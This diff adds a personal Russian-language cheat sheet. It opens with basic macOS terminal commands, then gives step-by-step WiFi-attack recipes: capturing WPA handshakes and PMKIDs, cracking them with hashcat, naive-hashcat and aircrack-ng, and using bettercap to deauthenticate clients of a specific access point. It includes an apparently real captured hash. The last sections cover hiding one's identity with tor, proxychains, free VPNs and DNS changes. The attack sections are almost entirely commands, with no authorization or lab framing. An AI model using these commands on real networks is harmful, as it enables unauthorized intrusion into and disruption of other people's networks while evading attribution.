@@ -1,0 +1,188 @@
+Команды
+# - csrutil disable csruyil enable - выключить и включить csr безопасность
+# - pwd
+# - clear
+# - man 
+# - --help
+# - cd
+# - ls
+# - ls -l - просмотр файлов с параметрами
+# - ls -la - просмотр всех файлов в том числе и скрытых
+# - nano создание текстового файла
+# - cat просмотр что в файле 
+# - less просмотр что в файле, в отличии от cat, less открывается в редакторе терминала
+# grep вытаскивает конкретно то что мы хотим найти из файла, короче фильтр
+Пример
+сat test20 | grep привет
+# - echo заменяет текст в файлах
+# - mkdir создать папку
+# - rmdir удалить папку
+# - touch создает файл
+# - rm удалить файл
+# - chown меняет права на файл
+# - chmod изменяет исполняемость файла, доступ к чтению или к редактированию кем либо и тд
+# - open
+# - open -a ""
+# - brew upgrade git
+# - mv - переименование файлов. Для примера, набрав в терминале mv new old, вы переименуете файл или директорию с названием new в old. А следующей командой: mv old ~/Documents - вы переместите его из текущей директории в вашу директорию Documents.
+# - cp -R Documents "Documents backup" - команда, посредством которой вы сохраняете резервную копию всей вашей директории Documents. Кавычки необходимы, так как в названии директории присутствует пробел.
+# - sudo cp -Rp /Users "/Users backup" - команда позволяет скопировать всю директорию /Пользователи (включая все домашние папки, находящиеся внутри), сохраняя при этом как можно больше файловой информации (принадлежность, права и т.д., но не ветвь ресурса) с названием Users backup. Вы должны выполнять эту команду из под учетной записи администратора, так, в данном примере используется sudo, позволяющая получить временный доступ с правами root. Если вы выполняете команду из-под учетной записи пользователя, вас попросят ввести пароль администратора.
+# - ditto Documents "Documents backup" - копирует всю директорию под именем "Documents" и называет копию директории "Documents backup".
+# - find / -name (имя файла без скобок) : команда осуществит поиск нужного вам файла по всей файловой структуре, включая все смонтированные диски (в том числе и сетевые) и отобразит полный путь к нему.
+
+
+
+
+
+Взлом вафай 1 naive-hashcat.sh macOS
+
+# ловим дамп(Файлы *.pcap)
+# конвертируем дамп, оставив в нём только наши хэши,это делает бинарник cap2hccapx из пакета hashcat-utis
+# сбор бинов cd hashcat-utils/src/ && make
+# конвертация дампа ./cap2hccapx.bin *.pcap *.hccapx
+# смотрим, что успели перехватить 2, попробуем сломать, для этого нам нужен naive-hashcat 
+# ввод - cd naive-hashcat
+# собираем софт для osx ./build-hashcat-osx.sh
+#? качаем вордлист для побора wpa/wpa2 сетей пароли (134MB) - curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+# указываем адрес нашего дампа и файл, куда будем писать подобранные пассы, 2500 это метка хэшкэту, что надо ломать именно WPA, ну и запускаем naive-hashcat
+# ввод HASH_FILE=*.hccapx POT_FILE=passwod.txt HASH_TYPE=2500 ./naive-hashcat.sh
+# смотрим файл passwod.txt
+
+
+
+
+
+Взлом вафай 2 aircrack-ng macOS
+
+# ловим дамп(Файлы *.pcap)
+# aircrack-ng *.pcap - смотрим наличие хэндшейков
+# вводим aircrack-ng -w словарь.txt *.pcap - брутим, указав путь к словарю
+
+
+
+
+
+Взлом вайфай 3 hashcat
+
+# создаем тхт файл - /usr/local/Cellar/hcxtools/6.0.2/bin/hcxpcapngtool -o *.txt *.pcap
+# смотрим файл - /usr/local/Cellar/hcxtools/6.0.2/bin/hcxhashtool -i *.txt --info=stdout
+# копируем код -  в текстовый редактор WPA*01*8637675732c1a90a0e968a1c98217c6c*788102d096a9*e42b34084632*4d4754535f47504f4e355f36393238***
+# вводим nano -w *.txt
+# Начинаем брутить 
+# вводдим hashcat -a 3 -m 22000 test1.22000 '6JQRP?u?u?u' с маской
+# hashcat -a 0 -m 22000 mgts.22000 rockyou.txt  по словарю
+
+
+
+
+
+Расшифровка в браузере 
+
+# старый формат 8637675732c1a90a0e968a1c98217c6c*788102d096a9*e42b34084632*4d4754535f47504f4e355f36393238 
+# новый формат WPA*01*8637675732c1a90a0e968a1c98217c6c*788102d096a9*e42b34084632*4d4754535f47504f4e355f36393238***
+
+
+
+
+
+Установка buttercup и просмотр сетей
+
+# установка - brew install bettercap
+# запуск, перед запуском отключить вайфай - sudo bettercap -iface en0
+# активируем мониторинговый режим и вводим wifi.recon on
+# смотрим список сетей - wifi.show 
+# переключение каналов - wifi.recon.channel 36
+# смотрим наличие хэндшейков - aircrack-ng file.pcap
+ 
+
+
+
+
+Отключаем вайфай 
+
+# вводим wifi.deauth e4:8d:8c:d9:07:8c
+# получить PMKID можно просто подключившись к точке доступа и введя неправильный пароль. Например, запустить мониторный режим на компьютере и пробовать подключиться с телефона, вводя случайный пароль. 
+# Bettercap сделает тоже самое с помощью команды  - wifi.assoc
+# для всех сетей - wifi.assoc all
+# для конкретной - wifi.assoc e4:8d:8c:d9:07:8c
+
+
+
+
+
+Переформатирование образов
+
+# diskutil list
+# diskutil unmountDisk /dev/disk2
+# dd if=/Users/aleksandrsletkin/Desktop/kali-linux-2020.1b-live-amd64\ \(1\).iso of=/dev/disk2 bs=1m
+
+
+
+
+Запуск tor
+
+# - tor и killall tor - запуск и остановка
+
+
+
+
+
+Запуск и стоп openvpn
+
+# - sudo brew services start openvpn
+# - sudo brew services stop openvpn
+
+
+
+
+
+Proxychains4
+ 
+# - proxychains4 open /Applications/Google\ Chrome.app
+# - proxychains4 open -a Google\ Chrome
+# - редактируем proxychains.conf - nano /usr/local/etc/proxychains.conf
+# - curl suip.biz/ip/ - узнать IP адрес свой
+
+
+
+
+
+Подключение VPN
+# - на сайте vpnbook.com скачиваем пакет openVPN
+# - идем в папку куда скачали пакет
+# - выбираем порт
+# - вводим, если не root, то 
+  1 sudo openvpn --config vpnbook-de4-tcp443.ovpn (kali)
+  2 sudo /usr/local/Cellar/openvpn/2.4.9/sbin/openvpn --config /Users/aleksandrsletkin/Desktop/openvpn/vpnbook-de4-tcp443.ovpn(mac OS)
+# - имя сайта
+# - пароль
+
+
+
+
+
+Графическое подключение настройки сети VPN
+
+# - Vpn - L2TP - VPN99 L2TP - произвольное
+# - fr1.vpnbook.com - адрес сервера PPTP
+# - vpnbook - имя учетной записи, берем с сайта vpnbook.com 
+# - в аутенфикации вводим произвольно ключ - 12345678 и пароль с сайта vpnbook.com 
+# - в дополнительно ставим галочку через VPN
+# - ставим галочку статусе VPN
+# - применить и подключить
+
+
+
+
+
+
+Скрываем свой DNS 
+# nano /etc/resolv.conf - комментируем свой DNS адрес (#) и вставляем адрес с сайта opendns.com
+
+
+
+
+
+
+
+#
